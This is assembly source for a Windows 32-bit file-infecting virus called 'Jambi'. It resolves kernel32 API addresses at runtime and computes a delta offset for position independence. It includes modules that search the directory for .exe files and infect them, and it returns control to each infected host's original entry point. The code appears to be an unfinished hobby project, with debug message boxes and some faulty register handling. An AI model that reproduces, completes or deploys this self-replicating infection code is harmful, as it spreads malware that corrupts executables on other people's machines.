; Jambi
; MASM32 asm program for Intel i386 processors running Windows 32bits
; By Deb0ch.

.386
.model flat, stdcall
option casemap:none

include \masm32\include\msvcrt.inc
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\user32.inc 
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\msvcrt.lib

include search_k32.asm
.code
  
begin_copy:

; �������������������������������������������������������������������������
; DATA (inside .code section)
; �������������������������������������������������������������������������
    msgCaption db "Hello", 0
    msgOfVictory        db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0
    msgText db "Hello, World!", 0
    kernel32_dll_name db "kernel32.dll", 0
    closehandle_name  db "CloseHandle", 0
    createfile_name     db "CreateFileA", 0
    findclose_name      db "FindClose", 0
    findfirstfile_name  db "FindFirstFileA", 0
    findnextfile_name   db "FindNextFileA", 0
    getfilesize_name    db "GetFileSize", 0
    messagebox_name     db "MessageBoxA", 0
    readfile_name       db "ReadFile", 0
    setfilepointer_name db "SetFilePointer", 0
    virtualalloc_name   db "VirtualAlloc", 0
    virtualfree_name    db "VirtualFree", 0
    writefile_name      db "WriteFile", 0    

    oldEntryPoint       dd 0
    

  
    user32_dll_name     db "User32.dll", 0
    getProcAddress_name db "GetProcAddress", 0
    loadLibrary_name    db "LoadLibraryA", 0

    file_regex          db "*.exe", 0
    
; Function names

    closehandle_addr  dd 0
    createfile_addr  dd 0
    findclose_addr  dd 0
    findfirstfile_addr dd 0
    findnextfile_addr dd 0
    getfilesize_addr dd 0
    messagebox_addr dd 0
    readfile_addr dd 0
    setfilepointer_addr dd 0 
    virtualalloc_addr dd 0 
    virtualfree_addr dd 0
    writefile_addr dd 0

; �������������������������������������������������������������������������
; DATA (inside .code section) - END
; �������������������������������������������������������������������������


; �������������������������������������������������������������������������
; PROCEDURES
; �������������������������������������������������������������������������

 include utils.asm
 ;include infect_file.asm
 include infect_file_2.asm
; �������������������������������������������������������������������������
; PROCEDURES - END
; �������������������������������������������������������������������������


; �������������������������������������������������������������������������
; eax: reserved for proc and func return values.
; ebx: delta offset
; esi: Parsing pointer. Keeps track of where we need to be in the PE.
; �������������������������������������������������������������������������

start:                                     ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY ***
; functions loading end.


    mov  esi, [esp]                        ; Look for last eip which was in kernel32.dll, and is now on the stack because of the call from there.

main PROC NEAR

    LOCAL getProcAddress_addr:DWORD
    LOCAL loadLibrary_addr:DWORD
    LOCAL imageBase:DWORD
    LOCAL filehandle:DWORD
    LOCAL fileptr:DWORD
    LOCAL filesearchhandle:DWORD
    LOCAL filesize:DWORD;local from main
    LOCAL buffer[256]: BYTE   ; Buffer for formatted string
   format BYTE 'File size: %d bytes', 0 ; Format string for displaying file size; Format string for displaying file size
    LOCAL win32finddata:WIN32_FIND_DATA



;before function addresses

    call delta_offset                      ; Get delta offset for position independence.
delta_offset:
    pop  ebx
    sub  ebx, delta_offset                 ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.
    
 
 SEARCH_K32                            ; Llamar a la macro SEARCH_K32

invoke LoadLibrary, addr kernel32_dll_name
    
    ; Verificar si se cargó correctamente la DLL
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final

   ; Load your functions here.
    
    ;invoke LoadLibrary, addr kernel32_dll_name
    mov ebx, eax ; Guardar el handle de la DLL en ebx
 
; Loads a function from a dll using GetProcAddress and LoadLibrary that we just got from kernel32.dll.
; Can be used ONLY within main procedure.

LOADFUNC MACRO fct_name, dll_name, result_container
 
    push edx                               ;
    call loadLibrary_addr                  ;
    lea  edx, dword ptr[ebx + offset fct_name]      ;
    push edx                               ;
    push eax                               ;
    call GetProcAddress            ;
    mov  result_container, eax             ; Sequence of instructions to load a function from a dll.
    
ENDM
    
    
    ; Obtener la dirección de la función CloseHandle
    invoke GetProcAddress, ebx, addr closehandle_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    
    
    
   ; push ebx
   ; add ebx,closehandle_addr
   ; mov ebx, eax ; Guardar la dirección de la función en closehandle_addr
  ;  pop ebx
    invoke MessageBox, NULL, addr closehandle_name, addr msgCaption, MB_OK  
    
    invoke GetProcAddress, ebx, addr createfile_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    push ebx
    add ebx,createfile_addr
    mov ebx, eax ; Guardar la dirección de la función en createfile_addr
    pop ebx
    invoke MessageBox, NULL, addr createfile_name, addr msgCaption, MB_OK  
    
    
    
    
    ; Obtener la dirección de la función 
    invoke GetProcAddress, ebx, addr  findclose_name 
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    push ebx
    add ebx,findclose_addr
    mov ebx, eax ; Guardar la dirección de la función 
    pop ebx
    invoke MessageBox, NULL, addr findclose_name , addr msgCaption, MB_OK  
    
    
    
    
    
    ; Obtener la dirección de la función 
    invoke GetProcAddress, ebx, addr findfirstfile_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    push ebx
    add ebx,findfirstfile_addr
    mov ebx, eax ; Guardar la dirección de la función 
    pop ebx
    invoke MessageBox, NULL, addr findfirstfile_name , addr msgCaption, MB_OK  
    ; Guardar la dirección de la función    
    
    
    
    
    
    ; Obtener la dirección de la función
    invoke GetProcAddress, ebx, addr getfilesize_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    push ebx
    add ebx,getfilesize_addr
    mov ebx, eax ; Guardar la dirección de la función 
    pop ebx
    invoke MessageBox, NULL, addr getfilesize_name , addr msgCaption, MB_OK  
   

    
       ; Obtener la dirección de la función 
    invoke GetProcAddress, ebx, addr readfile_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    push ebx
    add ebx,readfile_addr
    mov ebx, eax ; Guardar la dirección de la función 
    pop ebx
    invoke MessageBox, NULL, addr readfile_name , addr msgCaption, MB_OK      

    
       ; Obtener la dirección de la función 
    invoke GetProcAddress, ebx, addr setfilepointer_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    push ebx
    add ebx,setfilepointer_addr
    mov ebx, eax ; Guardar la dirección de la función 
    pop ebx
    invoke MessageBox, NULL, addr setfilepointer_name , addr msgCaption, MB_OK  
    
     ; Obtener la dirección de la función
     invoke GetProcAddress, ebx, addr virtualalloc_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
     test eax, eax
     jz f ; Si eax es cero (falla), saltar al final
     push ebx
     add ebx,virtualalloc_addr
     mov ebx, eax ; Guardar la dirección de la función 
     pop ebx
     invoke MessageBox, NULL, addr virtualalloc_name , addr msgCaption, MB_OK  
   
     ; Obtener la dirección de la función 
    invoke GetProcAddress, ebx, addr virtualfree_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
     push ebx
     add ebx,virtualfree_addr
     mov ebx, eax ; Guardar la dirección de la función 
     pop ebx
     invoke MessageBox, NULL, addr virtualfree_name , addr msgCaption, MB_OK  
    
      ; Obtener la dirección de la función CloseHandle
    invoke GetProcAddress, ebx, addr writefile_name
    
    
    ; Verificar si se obtuvo correctamente la dirección de la función
    test eax, eax
    jz f ; Si eax es cero (falla), saltar al final
    push ebx
    add ebx,writefile_addr
    mov ebx, eax ; Guardar la dirección de la función 
    pop ebx
    invoke MessageBox, NULL, addr writefile_name , addr msgCaption, MB_OK      
   
    jmp next
    f:
    ;LOADFUNC closehandle_name,    kernel32_dll_name, closehandle_addr malaaaayaaa
    ;LOADFUNC createfile_name,     kernel32_dll_name, createfile_addr
    ;LOADFUNC findclose_name,      kernel32_dll_name, findclose_addr
    ;LOADFUNC findfirstfile_name,  kernel32_dll_name, findfirstfile_addr
    ;LOADFUNC findnextfile_name,   kernel32_dll_name, findnextfile_addr
    ;LOADFUNC getfilesize_name,    kernel32_dll_name, getfilesize_addr
    
    ;LOADFUNC readfile_name,       kernel32_dll_name, readfile_addr
    ;LOADFUNC setfilepointer_name, kernel32_dll_name, setfilepointer_addr
    ;LOADFUNC virtualalloc_name,   kernel32_dll_name, virtualalloc_addr
    ;LOADFUNC virtualfree_name,    kernel32_dll_name, virtualfree_addr
    ;LOADFUNC writefile_name,      kernel32_dll_name, writefile_addr

; functions loading end.

    next:
    invoke MessageBox, NULL, addr msgOfVictory, addr msgOfVictory, MB_OK
; --------------------------------------> Now, time to infect the other files ! Niark niark niark...
    ;mov ecx,win32finddata              ; Load address of win32finddata into ECX
    
    ;push ecx                             ; Push address of win32finddata onto the stack
    ;mov  ecx,file_regex         ; Load address of file_regex into ECX
    ;push ecx                             ; Push address of file_regex onto the stack

    ;call findfirstfile_addr    ; Move address of FindFirstFile function into EAX
    ;call dword ptr[eax]   
    
    include search_files.asm                   ; Loop for searching and infecting all exe files in the directory.
   invoke MessageBox, NULL, addr msgText, addr msgCaption, MB_OK
    mov  ecx, dword ptr[ebx + oldEntryPoint]        ; Load the old entry point RVA.
    cmp  ecx, 0
    je   exit                              ; oldEntryPoint = 0 <=> it is the seed file and there is nowhere to jump after.

    call search_imgbase_get_eip
search_imgbase_get_eip:
    pop  esi                               ; esi -> somewhere inside our program (here).
    and  esi, 0FFFF0000h                   ; mask address inside our program to get page aligned like sections.
    cmp  word ptr [esi], "ZM"
    je   search_imgbase_end
search_imgbase:
    sub  esi, 01000h                       ; Going back and back, keeping the page/section alignment.
    cmp  word ptr [esi], "ZM"              ; Looking for the "MZ" signature of a DOS header. "ZM" for endianess.
    jne  search_imgbase
search_imgbase_end:
    add  esi, ecx                          ; add real ImgBase to oldEntryPoint RVA to make a VA.

    leave                                  ; Epilogue. Because of the jmp, the epilogue of the current procedure will never be executed, therefore this one is here.
    jmp  esi                               ; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.

exit:
    ret
main ENDP

end_copy:
    ret
end start
